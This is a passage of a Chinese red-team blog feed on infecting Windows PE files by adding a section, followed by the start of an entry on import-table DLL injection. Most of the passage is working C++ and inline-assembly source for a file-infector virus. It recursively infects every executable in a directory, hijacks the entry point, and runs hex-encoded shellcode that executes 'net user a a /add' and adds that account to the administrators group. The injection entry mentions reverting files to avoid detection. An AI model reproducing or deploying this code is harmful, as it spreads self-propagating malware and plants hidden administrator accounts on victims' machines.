class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.21-iat-zi-shen-gao-ji-wan-fa-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.21-iat-zi-shen-gao-ji-wan-fa-er/</url>
      
        <content type="html"><![CDATA[<h2 id="红队增加节方式感染PE文件原理（一）"><a href="#红队增加节方式感染PE文件原理（一）" class="headerlink" title="红队增加节方式感染PE文件原理（一）"></a>红队增加节方式感染PE文件原理（一）</h2><p>所谓感染PE文件，其实就是修改PE文件，在不改变其原有功能的基础上，添加我们自己的代码，在这里我们将PE文件看作是一般的文件，只是在修改时，要根据PE文件结构来进行update，否则的话就会破坏原有程序。这里我们不再对PE文件结构进行解释说明，请读者自行百度哈现在我们说下添加区段的一般步骤</p><h6 id="一-修改PE文件头部信息，需要修改的有IMAGE-FILE-HEADER的NumberOfSections（区块数目），IMAGE-OPTIONAL-HEADER的AddressOfEntryPoint，SizeOfImage，以及SizeOfCode，还有就是记录下原有程序的程序入口地点"><a href="#一-修改PE文件头部信息，需要修改的有IMAGE-FILE-HEADER的NumberOfSections（区块数目），IMAGE-OPTIONAL-HEADER的AddressOfEntryPoint，SizeOfImage，以及SizeOfCode，还有就是记录下原有程序的程序入口地点" class="headerlink" title="一.修改PE文件头部信息，需要修改的有IMAGE_FILE_HEADER的NumberOfSections（区块数目），IMAGE_OPTIONAL_HEADER的AddressOfEntryPoint，SizeOfImage，以及SizeOfCode，还有就是记录下原有程序的程序入口地点"></a>一.修改PE文件头部信息，需要修改的有IMAGE_FILE_HEADER的NumberOfSections（区块数目），IMAGE_OPTIONAL_HEADER的AddressOfEntryPoint，SizeOfImage，以及SizeOfCode，还有就是记录下原有程序的程序入口地点</h6><h6 id="二-申请一个IMAGE-SECTION-HEADER的内存模型，该IMAGE-SECTION-HEADER的SizeOfRawData，PointerToRawData，VirtualAddress，Characterics和-Misc-VirtualSize"><a href="#二-申请一个IMAGE-SECTION-HEADER的内存模型，该IMAGE-SECTION-HEADER的SizeOfRawData，PointerToRawData，VirtualAddress，Characterics和-Misc-VirtualSize" class="headerlink" title="二.申请一个IMAGE_SECTION_HEADER的内存模型，该IMAGE_SECTION_HEADER的SizeOfRawData，PointerToRawData，VirtualAddress，Characterics和.Misc.VirtualSize"></a>二.申请一个IMAGE_SECTION_HEADER的内存模型，该IMAGE_SECTION_HEADER的SizeOfRawData，PointerToRawData，VirtualAddress，Characterics和.Misc.VirtualSize</h6><h6 id="2-1-我们会知道要写入汇编代码的长度dwShellLen（该变量的值我们会事先得到）"><a href="#2-1-我们会知道要写入汇编代码的长度dwShellLen（该变量的值我们会事先得到）" class="headerlink" title="2.1 我们会知道要写入汇编代码的长度dwShellLen（该变量的值我们会事先得到）"></a>2.1 我们会知道要写入汇编代码的长度dwShellLen（该变量的值我们会事先得到）</h6><ol><li>SizeOfRawData的值就是dwShellLen根据文件对齐值之后的值</li><li>PointerToRawData的值就是源程序的最后一个节点的PointerToRawData+最后一个节点的SizeOfRawData</li><li>VirtualAddress的值是源程序最后一个节点的VirtualAddress+最后一个节点的根据内存对齐后的区块大小</li><li>Characteristic的值改成可读，可写，可执行Misc.VirtualSize的值就是不经过对齐的值（不经过文件对齐，不经过内存对齐，就是原有数据）</li></ol><h6 id="三-需要写入外壳的汇编代码，需要记下的就是将程序入口点修改成新节点的VirtualAddress。"><a href="#三-需要写入外壳的汇编代码，需要记下的就是将程序入口点修改成新节点的VirtualAddress。" class="headerlink" title="三.需要写入外壳的汇编代码，需要记下的就是将程序入口点修改成新节点的VirtualAddress。"></a>三.需要写入外壳的汇编代码，需要记下的就是将程序入口点修改成新节点的VirtualAddress。</h6><p>3.1在文件中写入外壳代码，需要注意的就是在PE程序中的偏移量是新节点的PointerToRawData</p><h2 id="红队增加节方式感染PE文件实现代码（二）"><a href="#红队增加节方式感染PE文件实现代码（二）" class="headerlink" title="红队增加节方式感染PE文件实现代码（二）"></a>红队增加节方式感染PE文件实现代码（二）</h2><pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"using namespace std;//////函数描述：根据所给路径检测文件是否是有效的PE文件///入口参数：char*描述文件路径///返回  值：是PE文件则返回true，否则返回false bool isPe(char* exePath){bool bIsPE=false;HANDLE hFile=CreateFile(exePath,GENERIC_ALL,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);if(INVALID_HANDLE_VALUE==hFile){MessageBox(NULL,"文件打开失败",0,0);return false;}::SetFilePointer(hFile,0,NULL,FILE_BEGIN);IMAGE_DOS_HEADER DosHeader={0};//DOS文件头DWORD dwWrite;ReadFile(hFile,&amp;DosHeader,sizeof(IMAGE_DOS_HEADER),&amp;dwWrite,NULL);if(DosHeader.e_magic==IMAGE_DOS_SIGNATURE){//ODS头部检测成功，开始检测FILE_HEADERIMAGE_NT_HEADERS NtHeader={0};//将文件指针移动到IMAGE_NT_HEADER的起始位置::SetFilePointer(hFile,DosHeader.e_lfanew,NULL,FILE_BEGIN);ReadFile(hFile,&amp;NtHeader,sizeof(IMAGE_NT_HEADERS),&amp;dwWrite,0);if(NtHeader.Signature==IMAGE_NT_SIGNATURE){bIsPE=true;}else{bIsPE=false;}}else{bIsPE=false;}if(bIsPE){ CloseHandle(hFile);return true;}else{ CloseHandle(hFile);return false; }} DWORD GetAlign(DWORD size,DWORD align){DWORD dwResult=0;if(sizee_lfanew);//记录下区块的数目WORD dwNumberOfSections=pNtHeader-&gt;FileHeader.NumberOfSections;IMAGE_SECTION_HEADER LastSection={0};int nCurNum=0;//记录下原来的OEPDWORD dwOldOEP=pNtHeader-&gt;OptionalHeader.AddressOfEntryPoint;DWORD dwWrite;SetFilePointer(hFile,pDosHeader-&gt;e_lfanew+sizeof(IMAGE_NT_HEADERS),0,0);DWORD dwTextBase=0;while(nCurNumOptionalHeader.FileAlignment;//获得内存对齐值DWORD dwSectionAlign=pNtHeader-&gt;OptionalHeader.SectionAlignment;DWORD dwShellLen;goto shellend; __asm      {  shell:  PUSHAD  PUSHFDPOPFD         POPAD      } shellend:      char*   pShell;      BYTE    jmp = 0xE9;      __asm      {          LEA EAX,shell          MOV pShell,EAX;          LEA EBX,shellend          SUB EBX,EAX          MOV dwShellLen,EBX      }  //修改区块的属性SectionShell.Characteristics=IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE;//新区块在磁盘中的大小SectionShell.SizeOfRawData=GetAlign(dwShellLen,dwFileAlign);SectionShell.Misc.VirtualSize=dwShellLen;//对齐最后一个区段后的大小计算壳区段的虚拟地址memcpy(&amp;SectionShell.Name,".try",4);SectionShell.VirtualAddress=LastSection.VirtualAddress+GetAlign(LastSection.Misc.VirtualSize,dwSectionAlign);SectionShell.PointerToRawData=LastSection.PointerToRawData+LastSection.SizeOfRawData;dwNumberOfSections++;//区块数目加1pNtHeader-&gt;FileHeader.NumberOfSections=dwNumberOfSections;DWORD dwAfterSection=GetAlign(dwShellLen,dwFileAlign);//修改镜像大小pNtHeader-&gt;OptionalHeader.SizeOfImage+=dwAfterSection;pNtHeader-&gt;OptionalHeader.SizeOfCode+=dwAfterSection;//重新定位入口地址pNtHeader-&gt;OptionalHeader.AddressOfEntryPoint=SectionShell.VirtualAddress;WriteFile(hFile,&amp;SectionShell,sizeof(SectionShell),&amp;dwWrite,NULL);//将外壳程序写入文件SetFilePointer(hFile, SectionShell.PointerToRawData ,NULL,FILE_BEGIN);WriteFile(hFile,pShell,dwShellLen,&amp;dwWrite,NULL);WriteFile(hFile,&amp;jmp, sizeof(jmp),&amp;dwWrite,NULL); dwOldOEP=dwOldOEP-(SectionShell.VirtualAddress+dwShellLen)-5;  WriteFile(hFile,&amp;dwOldOEP, sizeof(dwOldOEP),&amp;dwWrite,NULL);CloseHandle(hFile);}int _tmain(int argc, _TCHAR* argv[]){if(isPe("D:\\project\\tmp\\Debug\\tmp.exe")){addNewSection("D:\\project\\tmp\\Debug\\tmp.exe",NULL);}else{MessageBox(NULL,"该文件并非PE文件",0,0);}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="红队增加节方式感染PE文件核心解读（三）"><a href="#红队增加节方式感染PE文件核心解读（三）" class="headerlink" title="红队增加节方式感染PE文件核心解读（三）"></a>红队增加节方式感染PE文件核心解读（三）</h3><pre class="line-numbers language-none"><code class="language-none">这里有一个需要记下的就是CreateFileMappingA函数的使用，倒数第二和第三个参数，就是文件映射对象的大小，一般最小值的大小不但应该是文件大小，还应该在此基础上加上要外壳代码的大小，这样就行了，否则的话，就会出现不是有效的win32程序的错误主要注意的是：应该记下外壳代码的框架goto shellEnd;_asm{shellCode:      pushad;      pushfd;      popfd;       popad;}shellEnd:char*        pShell;DWORD  dwShellLen;_asm{       LEA  eax,shellCode       MOV pShell,eax;       LEA  EBX,shellEnd;       SUB EBX,EAX;       MOV  dwShellLen,EBX;  }这样汇编代码的首地址和汇编代码的长度就被放进了pShell,dwShellLen还有就是调回原有的起始地点，原有入口地点dwOldOEP=dwOldOEP-(SectionShell.VirtualAddress+dwShellLen)-5;(5是jmp指令的长度)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红队另类实战PE感染完整实现代码（四）"><a href="#红队另类实战PE感染完整实现代码（四）" class="headerlink" title="红队另类实战PE感染完整实现代码（四）"></a>红队另类实战PE感染完整实现代码（四）</h2><pre class="line-numbers language-none"><code class="language-none">// PE_Test.cpp : 定义控制台应用程序的入口点。//#include "stdafx.h"#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;assert.h&gt;//本程序只适用于载入基址定位的。。。非随机基址//感染指定目录的PE文件char ItIs[MAX_PATH] = "E:\\test222";//添加了一个新节区//然后shellcode是添加一个名为a，密码为a的administrator//然后PEB定位kernel32只在我的win7 x64电脑上测试成功，可以稍许修改，以通用//函数功能: 以ALIGN_BASE为对齐度对齐size//参数说明: //size:需要对齐的大小//ALIGN_BASE:对齐度//返回值:返回对齐后的大小DWORD Align(DWORD size, DWORD ALIGN_BASE){assert(0 != ALIGN_BASE);if (size % ALIGN_BASE){size = (size / ALIGN_BASE + 1) * ALIGN_BASE;}return size;}//函数功能: 检测感染标识和设置感染标识//参数说明://pDosHdr:执行DOS头//返回值:是否未被感染, 是-&gt;TRUE, 否-&gt;FALSEBOOL SetFectFlag(PIMAGE_DOS_HEADER &amp;pDosHdr){if (*(DWORD*)pDosHdr-&gt;e_res2 == 0x4B4B43){return FALSE;}else{*(DWORD*)pDosHdr-&gt;e_res2 = 0x4B4B43;return TRUE;}}//函数功能:打开文件并判断文件类型//参数说明://szPath:文件绝对路径//lpMemory:保存文件内存映射地址//返回值:是否是PE文件, 是-&gt;TRUE, 否-&gt;FALSEBOOL CreateFileAndCheck(char *szPath, LPVOID &amp;lpMemory, HANDLE &amp;hFile){//打开文件hFile = CreateFileA(szPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);if (hFile == INVALID_HANDLE_VALUE){//printf("CreateFileA %s Failed! ErrorCode = %d\n", szPath, GetLastError());return FALSE;}HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, NULL, NULL, NULL);if (!hMap){//printf("CreateFileMappingA %s Failed! ErrorCode = %d\n", szPath, GetLastError());return FALSE;}lpMemory = MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, NULL);if (!lpMemory){//printf("MapViewOfFile %s Failed! ErrorCode = %d\n", szPath, GetLastError());CloseHandle(hMap);return FALSE;}CloseHandle(hMap);return TRUE;}//函数功能: 感染指定文件//参数说明://szPath:文件绝对路径void FectPE(char *szPath){LPVOID lpMemory;HANDLE hFile;if (!CreateFileAndCheck(szPath, lpMemory, hFile)){return;}PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpMemory;//判断DOS标识if (*(WORD*)pDosHdr != 23117)goto Err;PIMAGE_NT_HEADERS32 pNtHdr = (PIMAGE_NT_HEADERS32)(*(DWORD*)&amp;pDosHdr + (DWORD)pDosHdr-&gt;e_lfanew);//判断NT标识if (*(WORD*)pNtHdr != 17744)goto Err;//设置感染标识if (!SetFectFlag(pDosHdr))goto Err;//检查可用空间if ((pNtHdr-&gt;FileHeader.NumberOfSections + 1) * sizeof(IMAGE_SECTION_HEADER) &gt; pNtHdr-&gt;OptionalHeader.SizeOfHeaders)goto Err;PIMAGE_SECTION_HEADER pSecHdr = (PIMAGE_SECTION_HEADER)(*(DWORD*)&amp;pNtHdr + sizeof(IMAGE_NT_HEADERS32));PIMAGE_SECTION_HEADER pNewHdr = (PIMAGE_SECTION_HEADER)(pSecHdr + pNtHdr-&gt;FileHeader.NumberOfSections);PIMAGE_SECTION_HEADER pLastHdr = (PIMAGE_SECTION_HEADER)(pNewHdr - 1);//检测是否有附加数据DWORD i = 0;DWORD size = pSecHdr-&gt;PointerToRawData;for (; i &lt; pNtHdr-&gt;FileHeader.NumberOfSections; i++){size += Align(pSecHdr-&gt;SizeOfRawData, pNtHdr-&gt;OptionalHeader.FileAlignment);}if (size != GetFileSize(hFile, 0)){return;//有附加数据}goto shellend;_asm{shellstart:pushadmov eax, fs : [0x30]; mov eax, [eax + 0x0c]; mov esi, [eax + 0x1c]lodsd; mov eax, [eax]; mov eax, [eax + 0x08]; mov ebp, eaxmov eax, dword ptr[eax + 0x3c]; mov eax, dword ptr[eax + ebp + 0x78]; mov ecx, [ebp + eax + 24];mov ebx, [ebp + eax + 32]; add ebx, ebppush dword ptr 0x00007373; push dword ptr 0x65726464push dword ptr 0x41636F72push dword ptr 0x50746547mov  edx, esppush ecxloc1:        mov edi, edxpop ecxdec ecxtest ecx, ecx        jz exitmov esi, [ebx + ecx * 4]add esi, ebppush ecxmov ecx, 15repz cmpsbtest ecx, ecxjnz loc1pop ecx; ecx = 0x244mov esi, [ebp + eax + 36]; add esi, ebpmovzx esi, word ptr[esi + ecx * 2]; mov edi, [ebp + eax + 28]; add edi, ebpmov edi, [edi + esi * 4]; add edi, ebp; edi = 0x771F1222/*xor ebx,ebx;构造LoadLibraryA字符串push ebxpush dword ptr 0x41797261push dword ptr 0x7262694Cpush dword ptr 0x64616F4Cpush esppush ebpcall edi;0x771F4977add esp,16;恢复堆栈push dword ptr 0x00006C6C;构造msvcrt.dll字符串push dword ptr 0x642E7472push dword ptr 0x6376736Dpush espcall eax;75AA0000add esp,12;恢复堆栈*/push dword ptr 0x00636578; push dword ptr 0x456E6957push esppush ebpcall edi;add esp, 8push eaxxor ebx, ebx; push ebxpush dword ptr 0x6464612Fpush dword ptr 0x20612061push dword ptr 0x20726573push dword ptr 0x75207465push dword ptr 0x6E20632Fpush dword ptr 0x20646D63push ebxmov ebx, espadd ebx, 4push ebxcall eaxadd esp, 28; pop eaxpush DWORD ptr 0x00646461; push DWORD ptr 0X2F206120push DWORD ptr 0X73726F74push DWORD ptr 0X61727473push DWORD ptr 0X696E696Dpush DWORD ptr 0X64612070push DWORD ptr 0X756F7267push DWORD ptr 0X6C61636Fpush DWORD ptr 0X6C207465push DWORD ptr 0X6E20632Fpush DWORD ptr 0X20646D63push DWORD ptr 0mov ebx, espadd ebx, 4push ebxcall eaxadd esp, 44exit:add esp, 16popadmov eax, 0x11111111jmp eax}shellend:PBYTE *pShell;DWORD nShellLen;_asm{lea eax, shellstartmov pShell, eaxlea ebx, shellendsub ebx, eaxmov nShellLen, ebx}//添加新节memcpy(pNewHdr-&gt;Name, ".kill", 4);pNewHdr-&gt;VirtualAddress = pLastHdr-&gt;VirtualAddress + Align(pLastHdr-&gt;Misc.VirtualSize, pNtHdr-&gt;OptionalHeader.SectionAlignment);pNewHdr-&gt;PointerToRawData = pLastHdr-&gt;PointerToRawData + Align(pLastHdr-&gt;SizeOfRawData, pNtHdr-&gt;OptionalHeader.FileAlignment);//新加节virtualsizeDWORD nSecSize = nShellLen;pNewHdr-&gt;Misc.VirtualSize = nSecSize;//这个值可以不是对齐的值 ps:貌似除了这个其他都要对齐哎╮(╯▽╰)╭pNewHdr-&gt;SizeOfRawData = Align(nSecSize, pNtHdr-&gt;OptionalHeader.FileAlignment);pNewHdr-&gt;Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;pNtHdr-&gt;FileHeader.NumberOfSections++;pNtHdr-&gt;OptionalHeader.SizeOfImage += Align(pNewHdr-&gt;Misc.VirtualSize, pNtHdr-&gt;OptionalHeader.SectionAlignment);//这个值必须是对齐的值pNtHdr-&gt;OptionalHeader.SizeOfCode += Align(pNewHdr-&gt;SizeOfRawData, pNtHdr-&gt;OptionalHeader.FileAlignment);//话说这个好像可要可不要//FlushViewOfFile(pDosHdr, 0);//写入shellcodeDWORD dwNum1 = 0;SetFilePointer(hFile, 0, 0, FILE_END);WriteFile(hFile, pShell, nShellLen, &amp;dwNum1, NULL);SetFilePointer(hFile, -6, 0, FILE_CURRENT);DWORD dwOldOp = pNtHdr-&gt;OptionalHeader.AddressOfEntryPoint;//printf("原始入口点: %XH\n", dwOldOp);dwOldOp += pNtHdr-&gt;OptionalHeader.ImageBase;//printf("原始程序加载点: %XH\n", dwOldOp);WriteFile(hFile, &amp;dwOldOp, 4, &amp;dwNum1, NULL);//写入剩余字节PBYTE pByte = (PBYTE)malloc(pNewHdr-&gt;SizeOfRawData - nShellLen);ZeroMemory(pByte, pNewHdr-&gt;SizeOfRawData - nShellLen);DWORD dwNum = 0;SetFilePointer(hFile, 0, 0, FILE_END);WriteFile(hFile, pByte, pNewHdr-&gt;SizeOfRawData - nShellLen, &amp;dwNum, NULL);//FlushFileBuffers(hFile);free(pByte);pNtHdr-&gt;OptionalHeader.AddressOfEntryPoint = pNewHdr-&gt;VirtualAddress;//printf("新入口点: %X\n", pNewHdr-&gt;VirtualAddress);Err:CloseHandle(hFile);UnmapViewOfFile(lpMemory);}//函数功能: 扫描查找文件//参数说明://szPath:需要扫描的目录void FindFile(char *szPath){WIN32_FIND_DATAA FindFileData;char szFileToFind[MAX_PATH] = { 0 };lstrcpyA(szFileToFind, szPath);lstrcatA(szFileToFind, "\\*.*");//查找目录下所有文件HANDLE hFile = FindFirstFileA(szFileToFind, &amp;FindFileData);if (hFile == INVALID_HANDLE_VALUE){printf("FindFirstFileA Failed!\n");return;}do{char szNewPath[MAX_PATH] = { 0 };lstrcpyA(szNewPath, szPath);//判断是否是目录if (FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY){//判断是否是.或..if (!lstrcmpA(FindFileData.cFileName, ".") || !lstrcmpA(FindFileData.cFileName, "..")){}else{//递归查找下级目录lstrcatA(szNewPath, "\\");lstrcatA(szNewPath, FindFileData.cFileName);FindFile(szNewPath);}}else{//处理查找到的文件char szExe[MAX_PATH] = { 0 };lstrcpyA(szExe, szNewPath);lstrcatA(szExe, "\\");lstrcatA(szExe, FindFileData.cFileName);MessageBoxA(NULL, szExe, NULL, 0);FectPE(szExe);}} while (FindNextFileA(hFile, &amp;FindFileData));FindClose(hFile);}int _tmain(int argc, _TCHAR* argv[]){FindFile(ItIs);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.20-iat-zi-shen-gao-ji-wan-fa-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.20-iat-zi-shen-gao-ji-wan-fa-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="导入表（IAT）高级玩法背景（一）"><a href="#导入表（IAT）高级玩法背景（一）" class="headerlink" title="导入表（IAT）高级玩法背景（一）"></a>导入表（IAT）高级玩法背景（一）</h2><p>首先让我们换一个角度观察一下模块的导入关系。假设有一个可执行程序A.exe，运行之后，其进程空间模块有hid.dll、msvcrt.dll、advapi32.dll，技术模块有ntdll.dll、kernel32.dll，代表其他模块的是other.dll，他们的导入关系如图所示：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653438874033/0a5400a51a7b441b9fcdf165343cd586.png" alt="image.png"></p><p>因为一个进程空间对于同一个dll模块只需要加载一个，所以简化一下模块的导入依赖关系可以看到如图所示。<br>简化后的模块导入依赖关系图看上去比较清晰和简洁，很像一棵树，树枝代表上面输入表逻辑结构中的IMAGE_IMPORT_DESCRIPTIOR结构。Windows的PE加载器就是根据这种依赖关系来加载模块的。<br>注入是为了让自己的模块可以加载到目标进程空间中，所以根据上述原理，我们可不可以在上面的导入关系中添加一个是我们自己模块的节点，就可以完成注入。<br>一般情况，输入表的加载都是通过修改进程、输入依赖树上某个模块的输入表来实现的（树上增加节点），这个修改动作是在进程加载该模块之前完成的（即修改模块文件的输入表）。等到待注入模块被加载到进程控件后，就可以将被修改的模块文件改回来，防止文件修改操作被发现。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653438874033/a329cc2fcdf6491f9ad786f5f2502fe7.gif" alt="image.png"></p><h2 id="导入表（IAT）高级玩法实现流程（二）"><a href="#导入表（IAT）高级玩法实现流程（二）" class="headerlink" title="导入表（IAT）高级玩法实现流程（二）"></a>导入表（IAT）高级玩法实现流程（二）</h2><h4 id="PE输入表注入的两种方法"><a href="#PE输入表注入的两种方法" class="headerlink" title="PE输入表注入的两种方法"></a>PE输入表注入的两种方法</h4><h4 id="静态修改PE文件法："><a href="#静态修改PE文件法：" class="headerlink" title="静态修改PE文件法："></a>静态修改PE文件法：</h4><p>1.备份原IID结构<br>2.在原IID区域构造新的OriginalFirstThunk、Name和FirstThunk结构<br>3.填充新输入表项的IID结构<br>4.修正PE文件头的信息</p><h4 id="进程创建期修改PE输入表法："><a href="#进程创建期修改PE输入表法：" class="headerlink" 